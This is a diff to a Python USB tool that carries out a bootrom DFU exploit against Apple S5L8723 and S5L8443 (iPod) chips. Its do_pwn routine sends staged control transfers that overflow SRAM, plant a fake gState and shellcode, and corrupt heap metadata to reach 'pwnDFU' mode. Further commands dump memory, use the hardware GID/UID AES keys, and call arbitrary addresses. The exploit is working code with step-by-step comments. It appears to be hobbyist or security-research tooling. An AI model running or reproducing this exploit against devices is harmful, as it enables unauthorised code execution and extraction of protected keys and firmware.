@@ -5,18 +5,39 @@ import struct
 import argparse
 from dataclasses import dataclass
 from contextlib import suppress
+from collections import namedtuple
+from pathlib import Path
 from enum import Enum
 
 import usb
 
+PlatformConfig = namedtuple("PlatformConfig", ["pid", "name", "config", "overwrite_len", "pwn_name", "fake_state"])
+
+PLATFORM_CONFIGS = [
+    PlatformConfig(
+        pid=0x1232,
+        name="S5L8723",
+        config="s5l8723",
+        overwrite_len=0x24C0,
+        pwn_name="S5L8723 pwnDFU",
+        fake_state="n6g_fake_state.bin"
+    ),
+    PlatformConfig(
+        pid=0x1233,
+        name="S5L8443",
+        config="s5l8443",
+        overwrite_len=0x24C0,
+        pwn_name="S5L8443 pwnDFU",
+        fake_state="s4g_fake_state.bin"
+    )
+]
+
 APPLE_VID = 0x5AC
-S5L8723_USBDFU_PID = 0x1232
 
 DNLD_MAX_PACKET_SIZE = 0x800
 UPLD_MAX_PACKET_SIZE = 0x40
 
 USB_TIMEOUT = 1000
-EXPECTED_USB_NAME = "S5L8723 pwnDFU"
 
 COMMAND_RESET  = 0x72657374   # 'rest'
 COMMAND_DUMP   = 0x64756D70   # 'dump'
@@ -27,6 +48,9 @@ COMMAND_CALL   = 0x66756E63   # 'func'
 AES_BLOCK_SIZE = 16
 AES_KEY_GID = 1
 AES_KEY_UID = 2
+
+SHELLCODE_ROOT = "shellcode/build"
+SHELLCODE_NAME = "shellcode.bin"
 
 class USBDFUError(Enum):
     errOk          = 0x00
@@ -83,19 +107,16 @@ class USBDFUDevice:
         self.dev = None
         self._open = False
 
-    def open(self, attempts: int = 5):
-        for _ in range(attempts):
-            try:
-                self.dev = usb.core.find(idProduct=self.pid, idVendor=self.vid)
-                assert self.dev
-                self._open = True
-                break
-            except Exception:
-                time.sleep(0.25)
-
-        if not self._open:
+    def open(self):
+        try:
+            self.dev = usb.core.find(idProduct=self.pid, idVendor=self.vid)
+            assert self.dev
+        except (usb.core.USBError, AssertionError):
             raise USBDFUDeviceError("cannot open USB device - is it even connected?")
         
+        self._open = True
+
+        # XXX do these even have any effect?
         self.dev.set_configuration(1)
         self.dev.set_interface_altsetting(0, 0)
 
@@ -155,7 +176,7 @@ class USBDFUDevice:
         return packets
 
     def request_image_validation(self, packets: int):
-        assert self.dev.ctrl_transfer(0x21, 1, packets + 1, 0, "", USB_TIMEOUT) == 0
+        assert self.dev.ctrl_transfer(0x21, 1, packets + 1, 0, None, USB_TIMEOUT) == 0
         try:
             for _ in range(3):
                 self.dev.ctrl_transfer(0xA1, 3, 0, 0, 6, USB_TIMEOUT)
@@ -176,7 +197,8 @@ class Image1:
     DATA_START_MAP = {
         "8900" : 0x800,
         "8442" : 0x800,
-        "8723" : 0x400
+        "8723" : 0x400,
+        "8443" : 0x400
     }
 
     def __init__(self, buffer: bytes):
@@ -201,21 +223,44 @@ class Image1:
                 self.certlen
             )
 
-def device_open() -> USBDFUDevice:
-    dev = USBDFUDevice(S5L8723_USBDFU_PID)
-    dev.open()
+def device_pwned(dev: USBDFUDevice, config: PlatformConfig) -> bool:
+    return dev.name() == config.pwn_name
 
-    name = dev.name()
+def device_open(expect_pwned: bool = True) -> tuple[USBDFUDevice, PlatformConfig]:
+    # XXX super whacky, gotta redo at some point
+    for platform in PLATFORM_CONFIGS:
+        dev = USBDFUDevice(platform.pid)
+        try:
+            dev.open()
+        except USBDFUDeviceError:
+            dev = None
+            continue
+        else:
+            break
 
-    if name != EXPECTED_USB_NAME:
-        print("unexpected USB device name, did you run the exploit?")
-        exit(-1)
+    if not dev:
+        raise RuntimeError("no device found")
+    
+    pwned = device_pwned(dev, platform)
 
+    print(
+        "found: %s USB %sDFU device" % 
+        (
+            platform.name,
+            "pwn" if pwned else ""
+        )
+    )
+
+    if expect_pwned and not pwned:
+        raise ValueError("device is NOT pwned")
+
+    # Hopefully it's good enough to bring DFU into idle state
     dev.clrstatus()
     dev.abort()
 
-    return dev
+    return dev, platform
 
+# Encodes a *command* to our DFU upload hook into raw bytes
 def cmd_encode(command: int, *args) -> bytes:
     buf = struct.pack("<I", command)
     for arg in args:
@@ -223,7 +268,16 @@ def cmd_encode(command: int, *args) -> bytes:
 
     return buf
 
+# Sends an encoded command and returns a reply
 def cmd_send(dev: USBDFUDevice, cmd: bytes, length: int = UPLD_MAX_PACKET_SIZE) -> bytes:
+    # All this hymnastics is needed to prevent random timeouts and pipe errors
+    # when we process a big amount of data (decrypting OSOS, for instance)
+    #
+    # Or maybe I misunderstood something about the protocol...
+    # Or something in gState needs a fix...
+    # Or their code is trash...
+    # Or it's a combination of all of these...
+
     dev.send_data(cmd)
 
     dev.dnload(None, 1)
@@ -239,6 +293,7 @@ def cmd_send(dev: USBDFUDevice, cmd: bytes, length: int = UPLD_MAX_PACKET_SIZE) 
 
     return ret
 
+# Common code for AES operations (a bit ugly)
 def aes_op(device: USBDFUDevice, cmd: int, key: int, buffer: bytes, iv: bytes = None, callback: callable = None) -> bytes:
     start = time.perf_counter()
     
@@ -305,52 +360,53 @@ def do_pwn(args):
     STATE_LEN    = 0x640
     STAGE0_LEN   = 0x780
     STAGE1_LEN   = 0x100
-    OVERRIDE_LEN = 0x24C0
     PORTION      = 0x40
 
-    with open("n6g_dfu_state.dump", "rb") as f:
+    dev, config = device_open(False)
+    if device_pwned(dev, config):
+        print("device is already pwned")
+        exit(0)
+
+    with open(config.fake_state, "rb") as f:
         state = f.read()
 
     assert len(state) == STATE_LEN
 
-    with open("payload.bin", "rb") as f:
+    with open(Path(SHELLCODE_ROOT) / config.config / SHELLCODE_NAME, "rb") as f:
         payload = f.read()
     
-    payload += b"\xff" * (OVERRIDE_LEN - STAGE0_LEN - STAGE1_LEN - len(state) - len(payload))
+    payload += b"\xff" * (config.overwrite_len - STAGE0_LEN - STAGE1_LEN - len(state) - len(payload))
 
-    dev = USBDFUDevice(S5L8723_USBDFU_PID)
-    dev.open()
-
-    if dev.name() == EXPECTED_USB_NAME:
-        print("device is already pwned")
-        exit(0)
-
-    dev.clrstatus()
-    dev.abort()
-
+    # sending 0x780 bytes first, which is almost the limit for a single transaction (0x800)
     dev.dev.ctrl_transfer(0x21, 1, 0, 0, b"\xff" * STAGE0_LEN, USB_TIMEOUT)
     dev.dev.ctrl_transfer(0xA1, 3, 0, 0, 6, USB_TIMEOUT)
 
+    # sending 0x100 bytes more as a new packet and thus triggering the bug
     dev.dev.ctrl_transfer(0x21, 1, 1, 0, b"\xff" * STAGE1_LEN, USB_TIMEOUT)
     dev.dev.ctrl_transfer(0xA1, 3, 0, 0, 6, USB_TIMEOUT)
 
+    # uploading a fake gState, it will end up at 0x2202E380 on both S5L8723 and S5L8443
     for i in range(0, len(state), PORTION):
         dev.dev.ctrl_transfer(0x21, 1, 1, 0, state[i : i + PORTION], USB_TIMEOUT)
         dev.dev.ctrl_transfer(0xA1, 3, 0, 0, 6, USB_TIMEOUT)
 
+    # uploading our payload immediately after (0x2202E380 + 0x640 = 0x2202E9C0)...
+    # ...along with all the garbage we need to send to reach the end of SRAM
     for z in range(0, len(payload), PORTION):
         dev.dev.ctrl_transfer(0x21, 1, 1, 0, payload[z : z + PORTION], USB_TIMEOUT)
         dev.dev.ctrl_transfer(0xA1, 3, 0, 0, 6, USB_TIMEOUT)
 
+    # Sending 0x30 bytes more
     dev.dev.ctrl_transfer(0x21, 1, 1, 0, b"\x00" * 0x30, USB_TIMEOUT)
     dev.dev.ctrl_transfer(0xA1, 3, 0, 0, 6, USB_TIMEOUT)
 
+    # this is what goes into the last 16 bytes
     last = struct.pack(
         "<4I",
-        0xC2F3E9B2,
-        0x0,
-        0x2202E380,
-        0x2202D900
+        0xC2F3E9B2, # unclear what it is, but incorrect value will break everything
+        0x0,        # state mask, 0 is good enough value
+        0x2202E380, # address of our fake gState
+        0x2202D900  # heap metadata address
     )
 
     dev.dev.ctrl_transfer(0x21, 1, 1, 0, last, USB_TIMEOUT)
@@ -358,22 +414,28 @@ def do_pwn(args):
 
     dev.clrstatus()
 
+    # trigger a DFU upload, so it will reach our payload!
     with suppress(usb.core.USBError):
         dev.upload()
 
     dev.close()
 
+    # wait a bit
+    # XXX poll this properly?
     time.sleep(0.5)
 
-    dev = USBDFUDevice(S5L8723_USBDFU_PID)
-    dev.open()
+    # re-opening the device and checking if it reached pwnDFU mode
+    dev, new_config = device_open(False)
 
-    name = dev.name()
-
-    if name != EXPECTED_USB_NAME:
-        print("unexpected USB device name after sending exploit - %s" % name)
+    if new_config is not config:
+        print("device changed SoC after running exploit?!")
         exit(-1)
 
+    if not device_pwned(dev, new_config):
+        print("exploit failed!")
+        exit(-1)
+
+    # should be good enough to reach dfuIDLE state again
     dev.abort()
 
     status = dev.getstatus()
@@ -383,7 +445,7 @@ def do_pwn(args):
     dev.close()
 
 def do_dump(args):
-    dev = device_open()
+    dev, _ = device_open()
 
     f = open(args.file, "wb")
 
@@ -428,7 +490,7 @@ def do_dump(args):
     )
 
 def do_aes(args):
-    dev = device_open()
+    dev, _ = device_open()
 
     if args.op == "dec":
         cmd = COMMAND_AESDEC
@@ -455,7 +517,7 @@ def do_aes(args):
     dev.close()
 
 def do_image1(args):
-    dev = device_open()
+    dev, _ = device_open()
 
     with open(args.input, "rb") as f:
         in_buf = f.read()
@@ -467,6 +529,7 @@ def do_image1(args):
     real_len = image1.bodylen
     padded_len = real_len
 
+    # this is probably whack and might result in garbage in the end of decrypted data
     if real_len % AES_BLOCK_SIZE:
         padded_len += AES_BLOCK_SIZE - (real_len % AES_BLOCK_SIZE)
     
@@ -495,7 +558,7 @@ def do_call(args):
         print("too many arguments")
         exit(-1)
 
-    dev = device_open()
+    dev, _ = device_open()
 
     cmd = cmd_encode(COMMAND_CALL, args.addr, *args.args)
     raw_ret = cmd_send(dev, cmd, 4)
@@ -505,8 +568,9 @@ def do_call(args):
 
     dev.close()
 
+# this is a bit whacky, check the hook code for more info
 def do_boot(args):
-    dev = device_open()
+    dev, _ = device_open()
 
     with open(args.file, "rb") as f:
         in_buf = f.read()
@@ -521,7 +585,7 @@ def do_boot(args):
     dev.close()
 
 def do_reboot(args):
-    dev = device_open()
+    dev, _ = device_open()
 
     with suppress(usb.core.USBError):
         cmd_send(dev, cmd_encode(COMMAND_RESET))
